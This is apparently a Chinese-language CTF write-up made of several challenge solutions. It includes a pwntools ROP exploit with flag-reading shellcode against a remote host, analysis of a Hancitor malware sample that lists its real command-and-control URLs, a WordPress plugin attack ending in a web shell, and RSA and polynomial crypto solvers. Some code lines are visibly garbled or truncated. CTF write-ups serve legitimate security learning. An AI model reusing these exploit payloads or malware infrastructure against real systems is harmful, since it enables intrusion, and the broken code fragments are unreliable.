_ = msg[45:51]
h = msg[51:55]
print(binascii.hexlify(h))
print(hex(fnv1a_32(msg[:51])))
data = open('data', 'rb').read()
# print(binascii.hexlify(data))
# print(binascii.hexlify(key))
# print(binascii.hexlify(iv))
key = hashlib.md5(key).digest()
iv = hashlib.md5(iv).digest()
shake = hashlib.shake_128(iv).digest(10000)
print(binascii.hexlify(shake))
outfile = open('out', 'wb')
ptr = 0
shake_ptr = 0
count = 0
while (ptr h', count) + iv[2:12]
    aes = AES.new(key, AES.MODE_GCM, nonce)
    # aes.decrypt(b'\x00' * total_length)
    plain = aes.decrypt(data[ptr+2:ptr+2+length-padding_size-16])
    # plain = aes.decrypt_and_verify(data[ptr+2:ptr+2+length-padding_size-16], 
data[ptr+2+length-padding_size-16:ptr+2+length-padding_size])
    # print(plain)
    outfile.write(plain)
    count += 1
    ptr += length + 2
    # print(binascii.hexlify(data[2023:2028]))
    shake_ptr += 4
    # break
outfile.close()
解出来⼀个HTML，html⽤blob保存了⼀个DOC，⾥⾯有宏，分析⼀下发现在Templates⽬录下⾯释放了⼀个
W0rd.dll，⽤Rundll32起了UminslaIIF0mt函数
这个实际上是Hancitor恶意软件，DLL⾥⾯RC4解密了很多东⻄，⾥⾯就有URL
提出了这个字符串http://satursed.com/8/forum.php|http://sameastar.ru/8/forum.php|http://ludiesibut.ru/8/
forum.php|，提示解压密码是c2 api的地址，但是这3个都是c2。尝试了各种排列组合都不太对，最后发现是
api.ipify.org的MD5，这东⻄确实访问过，但是只是⽤来查本机ip的，这是c2？？？
解压出来是⼀个golang的gob，不知道数据类型，得猜⼀猜，应该是字符串的数组或者map。最后发现是
map[string][]byte，解出来⾥⾯没什么东⻄，就知道是⼀个PNG⽂件，然后有⼀⼤块很乱的raw data，⽂件内容看
上去也不像PNG的特征。
这时候放了个新提示，说⽂件内容被随机打乱了。⽂件⾥⾯有个时间戳，然后还是个gob，可能是⽤golang打乱
的，脑洞⼀下，⽤这个时间戳的时间srand，然后rand.Shuffle
exit()
package main
import (
  // "encoding/gob"
  "fmt"
  // "os"
  "math/rand"
  "time"
)
func main() {
  rand.Seed(1658213396)
  t := time.Now().Unix()
  buffer := make([]int, 0x1134b)
  for i := 0; i  = PolynomialRing(GF(2))
for i in range(41):
    r.recvuntil('r(x) = ')
    rx = P(r.recvline().decode().strip())
    print(rx)
    r.recvuntil('a(x) = ')
    ax = P(r.recvline().decode().strip())
    print(ax)
    r.recvuntil('c(x) = ')
    cx = P(r.recvline().decode().strip())
    print(cx)
    bx = (rx - cx) / ax
    r.sendlineafter('> b(x) = ', str(bx))
#!/usr/bin/env python3
# -*- coding=utf-8 -*-
from pwn import *
DEBUG = 0
def main():
    if DEBUG:
        p = process("./devnull")
        context.log_level = "debug"
    else:
        p = remote("123.56.105.22", 40022)
    p.readuntil(b"please input your filename")
WP-UM
看源码装了usermeta插件，搜到⽂章https://wpscan.com/vulnerability/9d4a3f09-b011-4d87-ab63-332e505cf1
cd，根据题⽬意图侧信道爆破⽤户名密码即可，进后台插件shell，flag在usr⽬录下
AVR
因为n是4个128bit⼩素数平⽅的乘积，尝试喂给yafu分解sqrt(n)，分出来四个⼩素数
    pause()
    p.send(b"a" * 0x20)
    p.readuntil(b"discard\n")
    ret1 = 0x401511 # leave; ret
    payload1 = b"c" * 0x14 + p64(0x3fe000) + p64(0x3fe000) + p64(ret1)
    p.send(payload1)
    p.readuntil(b"new data\n")
    # gadget1: 0x0000000000401351 : mov eax, dword ptr [rbp - 0x18] ; leave ; ret
    gadget1 = 0x0000000000401351
    # gadget2: 0x4012D0 : mov esi, 1000h ; mov rdi, rax ;call _mprotect ; nop ; pop rbp 
; retn
    gadget2 = 0x4012D0
    # gadget3: 04014CE : mov eax, cs:size_0x60 ; movsxd rdx, eax ; mov rcx, [rbp-8] ; 
mov eax, [rbp-20h] ; mov rsi, rcx ; mov edi, eax ;
    gadget3 = 0x4014CE
    rbp2 = 0x3fe000 + 0x20
    rbp3 = 0x3fe000 + 0x48
    eax = 0x3fe000
    payload2 = p64(0x3fe000 + 0x18 + 0x18) + p64(gadget1) + p64(rbp2) + p64(eax) + 
p64(0) * 2 + p64(0) + p64(gadget2) + p64(rbp3)
    payload2 += p64(gadget3) + p64(0) + p64(0)
    p.send(payload2)
    p.readuntil(b"Thanks\n")
    shellcode = 
b'hflagj\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x02_\x99\x0f\x05'
    payload3 = p64(0x3fe050) + shellcode
    pause()
    p.send(payload3)
    p.interactive()
if __name__ == "__main__":
    main()
from pwn import *
import string
import base64
import math
from libnum import *
import gmpy2
import os
import json
# import random
from libnum import xgcd, solve_crt
from tqdm import tqdm
from hashlib import sha256, md5, sha1
from Crypto.Hash import SHA256
from Crypto.PublicKey import DSA
from Crypto.Cipher import AES, DES
from itertools import product
from sage.all import *
from Crypto.Util.number import *
import randcrack
import random
from sm4 import SM4Key
# # r = remote('hiyoko.quals.seccon.jp', '10042')
# # # context(log_level='debug')
# ALPHABET = string.ascii_letters + string.digits
# rec = r.recvline().decode().replace(' ', '')
# print(rec)
# rec = rec[rec.find('+')+1::]
# suffix = rec[rec.find('+')+1:rec.find(')')]
# digest = rec[rec.find('==')+2:-1]
# print(f"suffix: {suffix} \ndigest: {digest}")
# for i in product(ALPHABET, repeat=5):
#     prefix = ''.join(i)
#     guess = prefix + suffix
#     if md5(guess.encode()).hexdigest()[0:5] == digest:
#         log.info(f"Find XXXX: {prefix}")
#         break
# r.sendline(prefix.encode())
# r.interactive()
# r.recvline()
n = 
825087128028157397936509571571135911537250445897344436708319543186130753456324653736424
810410649459808198821658443200319919880575372144845091130855804111546590017923079893961
558351775626555781471041915746272179386453223904275880829857552266635835272606057819404
5804198551989679722201244547561044646931280001
e = 3
c = 
945272793717722090962030960824180726576357481511799904903841312265308706852971155205003
971821843069272938250385935597609059700446530436381124650731751982419593070224310399320
617914955227288662661442416421725698368791013785074809691867988444306279231013360024747
585261790352627234450209996422862329513284149
pad = lambda s:s + bytes([(len(s)-1)%16+1]*((len(s)-1)%16+1))
nn = isqrt(n)
p = 225933944608558304529179430753170813347
nnn = 58168156707034554506999754297878805611645169757838644738807204999343153499547
q = nn // p // nnn
assert n % p == 0 and n % q == 0
r = 223213222467584072959434495118689164399
s = 260594583349478633632570848336184053653
assert p**2*q**2*r**2*s**2 == n
phi = r*(r-1)*s*(s-1)
d = inverse(e, phi)
m = pow(c, d, r**2*s**2)
print(long_to_bytes(int(m)))